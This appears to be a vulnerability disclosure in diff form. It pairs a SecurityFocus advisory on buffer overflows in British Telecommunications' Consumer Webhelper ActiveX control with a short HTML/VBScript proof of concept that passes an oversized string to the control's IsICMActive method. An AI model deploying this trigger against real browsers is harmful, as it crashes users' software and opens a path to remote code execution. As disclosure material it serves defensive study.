@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/24219/info
+
+The British Telecommunications Consumer Webhelper ActiveX control is prone to multiple buffer-overflow vulnerabilities because it fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.
+
+Successfully exploiting these issues allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.
+
+Versions of British Telecommunications Consumer Webhelper ActiveX Control prior to 2.0.0.8 are vulnerable to these issues. 
+
+<!--
+
+British Telecommunications Consumer Webhelper Multiple Buffer Overflow POC
+By Parveen Vashishtha
+
+Desc:
+This is just POC.
+
+Tested on Windows XP SP2 English fully patched.
+
+-->
+
+<html>
+<object classid=&#039;clsid:EC5A4E7B-02EB-451D-B310-D5F2E0A4D8C3&#039; id=&#039;bt&#039;></object>
+<script language=&#039;vbscript&#039;>
+
+var=String(128, "A")
+
+bt.IsICMActive var 
+
+</script></html>
